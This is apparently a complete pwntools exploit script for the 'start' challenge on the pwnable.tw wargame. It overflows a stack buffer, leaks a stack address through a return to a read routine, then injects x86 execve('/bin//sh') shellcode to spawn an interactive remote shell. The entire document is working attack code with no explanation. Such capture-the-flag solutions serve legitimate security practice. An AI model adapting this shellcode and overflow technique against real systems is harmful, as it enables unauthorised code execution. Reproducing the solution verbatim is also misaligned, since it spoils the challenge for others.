from pwn import *

#r = process('./start')
r = remote('chall.pwnable.tw', 10000)

#raw_input()

shell = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

read = 0x8048087

s = r.recvuntil(':')
print s
r.sendline('a'*20 + p32(read))

s = r.recv()

target = 0x54 + (ord(s[1]) << 8) + (ord(s[2]) << 16) + (ord(s[3]) << 24)

print len(s)
print hex(ord(s[0]))
print hex(ord(s[1]))
print hex(ord(s[2]))
print hex(ord(s[3]))

r.sendline('a'*20 + p32(target) + shell)

r.sendline('ls')

r.interactive()
